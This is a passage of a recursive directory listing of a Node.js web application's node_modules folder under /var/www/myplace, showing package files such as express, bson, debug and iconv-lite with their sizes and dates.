-rw-r--r-- 1 root root  23K Aug  6  2015 long.js
-rw-r--r-- 1 root root 3.1K Oct  7  2015 map.js
-rw-r--r-- 1 root root  276 Aug  6  2015 max_key.js
-rw-r--r-- 1 root root  274 Aug  6  2015 min_key.js
-rw-r--r-- 1 root root  11K Jan 11  2017 objectid.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 parser
-rw-r--r-- 1 root root  781 Dec  5  2016 regexp.js
-rw-r--r-- 1 root root  781 Aug  6  2015 symbol.js
-rw-r--r-- 1 root root  24K Aug  6  2015 timestamp.js

/var/www/myplace/node_modules/bson/lib/bson/parser:
total 76K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 7.5K Dec  5  2016 calculate_size.js
-rw-r--r-- 1 root root  23K Jan  2  2017 deserializer.js
-rw-r--r-- 1 root root  35K Dec  7  2016 serializer.js

/var/www/myplace/node_modules/buffer-shims:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 3.2K May  6  2016 index.js
-rw-r--r--  1 root root 1.1K May  6  2016 license.md
-rw-r--r--  1 root root 1.3K Sep  2  2017 package.json
-rw-r--r--  1 root root  497 May  6  2016 readme.md

/var/www/myplace/node_modules/bytes:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.3K Jun  1  2016 History.md
-rw-r--r--  1 root root 3.3K Jun  1  2016 index.js
-rw-r--r--  1 root root 1.2K Nov 13  2015 LICENSE
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.3K Jun  1  2016 Readme.md

/var/www/myplace/node_modules/content-disposition:
total 40K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  866 Dec  9  2016 HISTORY.md
-rw-r--r--  1 root root  11K Dec  9  2016 index.js
-rw-r--r--  1 root root 1.1K Sep 19  2014 LICENSE
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root 5.1K Dec  9  2016 README.md

/var/www/myplace/node_modules/content-type:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  265 May 10  2016 HISTORY.md
-rw-r--r--  1 root root 4.6K May 10  2016 index.js
-rw-r--r--  1 root root 1.1K May 10  2016 LICENSE
-rw-r--r--  1 root root 1.9K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.8K May 10  2016 README.md

/var/www/myplace/node_modules/cookie:
total 36K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.6K May 27  2016 HISTORY.md
-rw-r--r--  1 root root 3.9K May 27  2016 index.js
-rw-r--r--  1 root root 1.2K May 21  2016 LICENSE
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 8.1K May 27  2016 README.md

/var/www/myplace/node_modules/cookie-signature:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  695 Feb  3  2015 History.md
-rw-r--r--  1 root root 1.3K Feb  3  2015 index.js
-rw-r--r--  1 root root   29 Jan 28  2014 .npmignore
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.5K Jun 19  2014 Readme.md

/var/www/myplace/node_modules/core-util-is:
total 44K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  16K Nov 20  2015 float.patch
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Nov 20  2015 LICENSE
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root   67 Nov 20  2015 README.md
-rw-r--r--  1 root root 2.1K Nov 20  2015 test.js

/var/www/myplace/node_modules/core-util-is/lib:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 3.0K Nov 20  2015 util.js

/var/www/myplace/node_modules/crc:
total 24K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Dec  7  2015 LICENSE
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.5K Dec 12  2016 README.md

/var/www/myplace/node_modules/crc/lib:
total 60K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 2.9K Dec 12  2016 crc16_ccitt.js
-rw-r--r-- 1 root root 2.9K Dec 12  2016 crc16.js
-rw-r--r-- 1 root root 2.9K Dec 12  2016 crc16_kermit.js
-rw-r--r-- 1 root root 3.0K Dec 12  2016 crc16_modbus.js
-rw-r--r-- 1 root root  911 Dec 12  2016 crc16_xmodem.js
-rw-r--r-- 1 root root  708 Dec 12  2016 crc1.js
-rw-r--r-- 1 root root 3.5K Dec 12  2016 crc24.js
-rw-r--r-- 1 root root 3.9K Dec 12  2016 crc32.js
-rw-r--r-- 1 root root 2.4K Dec 12  2016 crc8_1wire.js
-rw-r--r-- 1 root root 2.4K Dec 12  2016 crc8.js
-rw-r--r-- 1 root root  380 Dec 12  2016 create_buffer.js
-rw-r--r-- 1 root root  283 Dec 12  2016 define_crc.js
-rw-r--r-- 1 root root  380 Dec 12  2016 index.js

/var/www/myplace/node_modules/debug:
total 84K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  12K May 17  2017 CHANGELOG.md
-rw-r--r--  1 root root  321 May 17  2017 component.json
-rw-r--r--  1 root root   46 Feb 10  2017 .coveralls.yml
-rw-r--r--  1 root root  180 Feb 10  2017 .eslintrc
-rw-r--r--  1 root root 1.7K Feb 10  2017 karma.conf.js
-rw-r--r--  1 root root 1.1K Oct 27  2016 LICENSE
-rw-r--r--  1 root root 1.1K Feb 10  2017 Makefile
-rw-r--r--  1 root root   40 Feb 10  2017 node.js
-rw-r--r--  1 root root   72 Apr 20  2017 .npmignore
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root  18K May 17  2017 README.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 src
-rw-r--r--  1 root root  140 Feb 10  2017 .travis.yml

/var/www/myplace/node_modules/debug/src:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 4.6K May 17  2017 browser.js
-rw-r--r-- 1 root root 4.3K Apr 20  2017 debug.js
-rw-r--r-- 1 root root  263 Feb 10  2017 index.js
-rw-r--r-- 1 root root 5.9K May 17  2017 node.js

/var/www/myplace/node_modules/depd:
total 48K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.0K Jul 27  2017 History.md
-rw-r--r--  1 root root  11K Jul 27  2017 index.js
drwxr-xr-x  4 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Feb 13  2017 LICENSE
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root  10K Feb 13  2017 Readme.md

/var/www/myplace/node_modules/depd/lib:
total 16K
drwxr-xr-x 4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 2 root root 4.0K Sep  2  2017 browser
drwxr-xr-x 2 root root 4.0K Sep  2  2017 compat

/var/www/myplace/node_modules/depd/lib/browser:
total 12K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 1.5K Jul 27  2017 index.js

/var/www/myplace/node_modules/depd/lib/compat:
total 20K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 2.2K Feb 13  2017 callsite-tostring.js
-rw-r--r-- 1 root root  338 Feb 13  2017 event-listener-count.js
-rw-r--r-- 1 root root 1.4K Jul 27  2017 index.js

/var/www/myplace/node_modules/destroy:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.1K Jan 13  2016 index.js
-rw-r--r--  1 root root 1.1K Aug 14  2014 LICENSE
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.2K Jan 13  2016 README.md

/var/www/myplace/node_modules/ee-first:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.7K May 25  2015 index.js
-rw-r--r--  1 root root 1.1K Aug 15  2014 LICENSE
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.6K May 25  2015 README.md

/var/www/myplace/node_modules/encodeurl:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  159 Jun 10  2016 HISTORY.md
-rw-r--r--  1 root root 1.6K Jun 10  2016 index.js
-rw-r--r--  1 root root 1.1K Jun 10  2016 LICENSE
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.6K Jun 10  2016 README.md

/var/www/myplace/node_modules/es6-promise:
total 32K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.9K May 12  2016 CHANGELOG.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 dist
drwxr-xr-x  3 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Feb 26  2015 LICENSE
-rw-r--r--  1 root root 2.6K Sep  2  2017 package.json
-rw-r--r--  1 root root 2.2K May 12  2016 README.md

/var/www/myplace/node_modules/es6-promise/dist:
total 48K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  32K May 12  2016 es6-promise.js
-rw-r--r-- 1 root root 6.5K May 12  2016 es6-promise.min.js

/var/www/myplace/node_modules/es6-promise/lib:
total 16K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 es6-promise
-rw-r--r-- 1 root root  500 Feb 13  2016 es6-promise.umd.js

/var/www/myplace/node_modules/es6-promise/lib/es6-promise:
total 52K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 2.9K May 12  2016 asap.js
-rw-r--r-- 1 root root 2.7K May 12  2016 enumerator.js
-rw-r--r-- 1 root root 5.8K May 12  2016 -internal.js
-rw-r--r-- 1 root root  594 Apr  4  2015 polyfill.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 promise
-rw-r--r-- 1 root root 8.8K May 12  2016 promise.js
-rw-r--r-- 1 root root  619 May 12  2016 then.js
-rw-r--r-- 1 root root  478 Apr 14  2015 utils.js

/var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise:
total 24K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 1.6K Feb 29  2016 all.js
-rw-r--r-- 1 root root 2.3K May 12  2016 race.js
-rw-r--r-- 1 root root 1.2K May 12  2016 reject.js
-rw-r--r-- 1 root root 1.1K May 12  2016 resolve.js

/var/www/myplace/node_modules/escape-html:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.4K Sep  1  2015 index.js
-rw-r--r--  1 root root 1.2K Sep  1  2015 LICENSE
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root  707 Sep  1  2015 Readme.md

/var/www/myplace/node_modules/etag:
total 32K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.7K Feb 19  2017 HISTORY.md
-rw-r--r--  1 root root 2.5K Feb 19  2017 index.js
-rw-r--r--  1 root root 1.1K Feb 19  2017 LICENSE
-rw-r--r--  1 root root 2.2K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.2K Feb 19  2017 README.md

/var/www/myplace/node_modules/express:
total 140K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 102K Aug  7  2017 History.md
-rw-r--r--  1 root root  224 Jan 15  2017 index.js
drwxr-xr-x  4 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.3K Jan 15  2017 LICENSE
drwxr-xr-x  4 root root 4.0K Sep  2  2017 node_modules
-rw-r--r--  1 root root 3.9K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.4K Aug  6  2017 Readme.md

/var/www/myplace/node_modules/express/lib:
total 88K
drwxr-xr-x 4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  14K Aug  6  2017 application.js
-rw-r--r-- 1 root root 2.2K Aug  6  2017 express.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 middleware
-rw-r--r-- 1 root root  12K Aug  6  2017 request.js
-rw-r--r-- 1 root root  25K Aug  6  2017 response.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 router
-rw-r--r-- 1 root root 5.7K Aug  6  2017 utils.js
-rw-r--r-- 1 root root 3.1K Aug  6  2017 view.js

/var/www/myplace/node_modules/express/lib/middleware:
total 16K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  853 Aug  6  2017 init.js
-rw-r--r-- 1 root root  885 Aug  6  2017 query.js

/var/www/myplace/node_modules/express/lib/router:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  15K Aug  6  2017 index.js
-rw-r--r-- 1 root root 3.3K Aug  6  2017 layer.js
-rw-r--r-- 1 root root 4.1K Aug  6  2017 route.js

/var/www/myplace/node_modules/express/node_modules:
total 16K
drwxr-xr-x 4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 debug
drwxr-xr-x 5 root root 4.0K Sep  2  2017 qs

/var/www/myplace/node_modules/express/node_modules/debug:
total 84K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K May 18  2017 CHANGELOG.md
-rw-r--r-- 1 root root  321 May 18  2017 component.json
-rw-r--r-- 1 root root   46 Dec 25  2016 .coveralls.yml
-rw-r--r-- 1 root root  180 Dec 25  2016 .eslintrc
-rw-r--r-- 1 root root 1.7K Dec 21  2016 karma.conf.js
-rw-r--r-- 1 root root 1.1K Oct 22  2016 LICENSE
-rw-r--r-- 1 root root 1.1K Feb 10  2017 Makefile
-rw-r--r-- 1 root root   40 Dec 25  2016 node.js
-rw-r--r-- 1 root root   72 May 18  2017 .npmignore
-rw-r--r-- 1 root root 2.1K Sep  2  2017 package.json
-rw-r--r-- 1 root root  18K May 18  2017 README.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 src
-rw-r--r-- 1 root root  140 Dec 25  2016 .travis.yml

/var/www/myplace/node_modules/express/node_modules/debug/src:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 4.7K May 18  2017 browser.js
-rw-r--r-- 1 root root 4.3K May 18  2017 debug.js
-rw-r--r-- 1 root root  263 Dec 21  2016 index.js
-rw-r--r-- 1 root root 5.9K May 18  2017 node.js

/var/www/myplace/node_modules/express/node_modules/qs:
total 68K
drwxr-xr-x 5 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K Jun 28  2017 CHANGELOG.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 dist
-rw-r--r-- 1 root root  399 Jun 28  2017 .editorconfig
-rw-r--r-- 1 root root    5 May 24  2017 .eslintignore
-rw-r--r-- 1 root root  533 Jun 28  2017 .eslintrc
drwxr-xr-x 2 root root 4.0K Sep  2  2017 lib
-rw-r--r-- 1 root root 1.7K May 24  2017 LICENSE
-rw-r--r-- 1 root root 2.2K Sep  2  2017 package.json
-rw-r--r-- 1 root root  15K Jun 14  2017 README.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 test

/var/www/myplace/node_modules/express/node_modules/qs/dist:
total 28K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  19K Jun 28  2017 qs.js

/var/www/myplace/node_modules/express/node_modules/qs/lib:
total 40K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  387 May 30  2017 formats.js
-rw-r--r-- 1 root root  211 Jun 14  2017 index.js
-rw-r--r-- 1 root root 5.7K Jun 14  2017 parse.js
-rw-r--r-- 1 root root 6.2K Jun 28  2017 stringify.js
-rw-r--r-- 1 root root 5.0K Jun 14  2017 utils.js

/var/www/myplace/node_modules/express/node_modules/qs/test:
total 68K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 5 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  229 Jun 14  2017 .eslintrc
-rw-r--r-- 1 root root   81 May 30  2017 index.js
-rw-r--r-- 1 root root  22K Jun 14  2017 parse.js
-rw-r--r-- 1 root root  21K Jun 28  2017 stringify.js
-rw-r--r-- 1 root root 1.4K Jun 14  2017 utils.js

/var/www/myplace/node_modules/express-session:
total 84K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 8.6K Aug  3  2017 HISTORY.md
-rw-r--r--  1 root root  16K Aug  3  2017 index.js
-rw-r--r--  1 root root 1.2K Aug  3  2017 LICENSE
drwxr-xr-x  3 root root 4.0K Sep  2  2017 node_modules
-rw-r--r--  1 root root 2.4K Sep  2  2017 package.json
-rw-r--r--  1 root root  32K Aug  3  2017 README.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 session

/var/www/myplace/node_modules/express-session/node_modules:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 debug

/var/www/myplace/node_modules/express-session/node_modules/debug:
total 84K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K May 18  2017 CHANGELOG.md
-rw-r--r-- 1 root root  321 May 18  2017 component.json
-rw-r--r-- 1 root root   46 Dec 25  2016 .coveralls.yml
-rw-r--r-- 1 root root  180 Dec 25  2016 .eslintrc
-rw-r--r-- 1 root root 1.7K Dec 21  2016 karma.conf.js
-rw-r--r-- 1 root root 1.1K Oct 22  2016 LICENSE
-rw-r--r-- 1 root root 1.1K Feb 10  2017 Makefile
-rw-r--r-- 1 root root   40 Dec 25  2016 node.js
-rw-r--r-- 1 root root   72 May 18  2017 .npmignore
-rw-r--r-- 1 root root 2.1K Sep  2  2017 package.json
-rw-r--r-- 1 root root  18K May 18  2017 README.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 src
-rw-r--r-- 1 root root  140 Dec 25  2016 .travis.yml

/var/www/myplace/node_modules/express-session/node_modules/debug/src:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 4.7K May 18  2017 browser.js
-rw-r--r-- 1 root root 4.3K May 18  2017 debug.js
-rw-r--r-- 1 root root  263 Dec 21  2016 index.js
-rw-r--r-- 1 root root 5.9K May 18  2017 node.js

/var/www/myplace/node_modules/express-session/session:
total 24K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 2.1K Aug  3  2017 cookie.js
-rw-r--r-- 1 root root 3.5K Aug  3  2017 memory.js
-rw-r--r-- 1 root root 3.0K Aug  3  2017 session.js
-rw-r--r-- 1 root root 1.8K Aug  3  2017 store.js

/var/www/myplace/node_modules/finalhandler:
total 36K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 3.4K Aug  4  2017 HISTORY.md
-rw-r--r--  1 root root 5.8K Aug  4  2017 index.js
-rw-r--r--  1 root root 1.1K Aug  4  2017 LICENSE
drwxr-xr-x  3 root root 4.0K Sep  2  2017 node_modules
-rw-r--r--  1 root root 2.4K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.9K Aug  4  2017 README.md

/var/www/myplace/node_modules/finalhandler/node_modules:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 debug

/var/www/myplace/node_modules/finalhandler/node_modules/debug:
total 84K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  12K May 18  2017 CHANGELOG.md
-rw-r--r-- 1 root root  321 May 18  2017 component.json
-rw-r--r-- 1 root root   46 Dec 25  2016 .coveralls.yml
-rw-r--r-- 1 root root  180 Dec 25  2016 .eslintrc
-rw-r--r-- 1 root root 1.7K Dec 21  2016 karma.conf.js
-rw-r--r-- 1 root root 1.1K Oct 22  2016 LICENSE
-rw-r--r-- 1 root root 1.1K Feb 10  2017 Makefile
-rw-r--r-- 1 root root   40 Dec 25  2016 node.js
-rw-r--r-- 1 root root   72 May 18  2017 .npmignore
-rw-r--r-- 1 root root 2.1K Sep  2  2017 package.json
-rw-r--r-- 1 root root  18K May 18  2017 README.md
drwxr-xr-x 2 root root 4.0K Sep  2  2017 src
-rw-r--r-- 1 root root  140 Dec 25  2016 .travis.yml

/var/www/myplace/node_modules/finalhandler/node_modules/debug/src:
total 36K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 4.7K May 18  2017 browser.js
-rw-r--r-- 1 root root 4.3K May 18  2017 debug.js
-rw-r--r-- 1 root root  263 Dec 21  2016 index.js
-rw-r--r-- 1 root root 5.9K May 18  2017 node.js

/var/www/myplace/node_modules/forwarded:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root   59 Sep 21  2014 HISTORY.md
-rw-r--r--  1 root root  641 Sep 21  2014 index.js
-rw-r--r--  1 root root 1.1K Sep 19  2014 LICENSE
-rw-r--r--  1 root root 1.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.4K Sep 21  2014 README.md

/var/www/myplace/node_modules/fresh:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.2K Feb 22  2017 HISTORY.md
-rw-r--r--  1 root root 1.7K Feb 20  2017 index.js
-rw-r--r--  1 root root 1.2K Feb 19  2017 LICENSE
-rw-r--r--  1 root root 2.1K Sep  2  2017 package.json
-rw-r--r--  1 root root 3.2K Feb 22  2017 README.md

/var/www/myplace/node_modules/http-errors:
total 36K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.6K Aug  5  2017 HISTORY.md
-rw-r--r--  1 root root 5.7K Feb 14  2017 index.js
-rw-r--r--  1 root root 1.2K Feb 13  2017 LICENSE
-rw-r--r--  1 root root 2.4K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.7K Feb 13  2017 README.md

/var/www/myplace/node_modules/iconv-lite:
total 44K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 2.6K Nov 21  2016 Changelog.md
drwxr-xr-x  3 root root 4.0K Sep  2  2017 encodings
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Jan 18  2016 LICENSE
-rw-r--r--  1 root root   44 Jan 18  2016 .npmignore
-rw-r--r--  1 root root 2.8K Sep  2  2017 package.json
-rw-r--r--  1 root root 6.6K Nov 21  2016 README.md
-rw-r--r--  1 root root  259 Nov 21  2016 .travis.yml

/var/www/myplace/node_modules/iconv-lite/encodings:
total 124K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  21K Jan 18  2016 dbcs-codec.js
-rw-r--r-- 1 root root 8.1K Nov 21  2016 dbcs-data.js
-rw-r--r-- 1 root root  709 Jan 18  2016 index.js
-rw-r--r-- 1 root root 6.0K Jan 18  2016 internal.js
-rw-r--r-- 1 root root 2.2K Jan 18  2016 sbcs-codec.js
-rw-r--r-- 1 root root  32K Jan 18  2016 sbcs-data-generated.js
-rw-r--r-- 1 root root 4.3K Jan 18  2016 sbcs-data.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 tables
-rw-r--r-- 1 root root 4.9K Nov 21  2016 utf16.js
-rw-r--r-- 1 root root 9.0K Jan 18  2016 utf7.js

/var/www/myplace/node_modules/iconv-lite/encodings/tables:
total 236K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  18K Jan 18  2016 big5-added.json
-rw-r--r-- 1 root root  47K Jan 18  2016 cp936.json
-rw-r--r-- 1 root root  38K Jan 18  2016 cp949.json
-rw-r--r-- 1 root root  42K Jan 18  2016 cp950.json
-rw-r--r-- 1 root root  41K Jan 18  2016 eucjp.json
-rw-r--r-- 1 root root 2.2K Jan 18  2016 gb18030-ranges.json
-rw-r--r-- 1 root root 1.2K Jan 18  2016 gbk-added.json
-rw-r--r-- 1 root root  24K Jan 18  2016 shiftjis.json

/var/www/myplace/node_modules/iconv-lite/lib:
total 40K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 1.1K Jan 18  2016 bom-handling.js
-rw-r--r-- 1 root root 8.4K Jan 18  2016 extend-node.js
-rw-r--r-- 1 root root 1.1K Nov 21  2016 index.d.ts
-rw-r--r-- 1 root root 4.5K Jan 18  2016 index.js
-rw-r--r-- 1 root root 3.3K Jan 18  2016 streams.js

/var/www/myplace/node_modules/inherits:
total 28K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  672 May 16  2013 inherits_browser.js
-rw-r--r--  1 root root  192 Sep  7  2016 inherits.js
-rw-r--r--  1 root root  749 Aug 19  2013 LICENSE
-rw-r--r--  1 root root 1.5K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.6K May 16  2013 README.md

/var/www/myplace/node_modules/ipaddr.js:
total 64K
drwxr-xr-x  5 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  543 Jun 22  2017 bower.json
-rw-r--r--  1 root root  658 Jun 22  2017 Cakefile
-rw-r--r--  1 root root 8.3K Jun 22  2017 ipaddr.min.js
drwxr-xr-x  2 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.1K Mar 14  2017 LICENSE
-rw-r--r--  1 root root   19 Mar 14  2017 .npmignore
-rw-r--r--  1 root root 1.6K Sep  2  2017 package.json
-rw-r--r--  1 root root 8.0K Jun 22  2017 README.md
drwxr-xr-x  2 root root 4.0K Sep  2  2017 src
drwxr-xr-x  2 root root 4.0K Sep  2  2017 test
-rw-r--r--  1 root root   99 Mar 14  2017 .travis.yml

/var/www/myplace/node_modules/ipaddr.js/lib:
total 28K
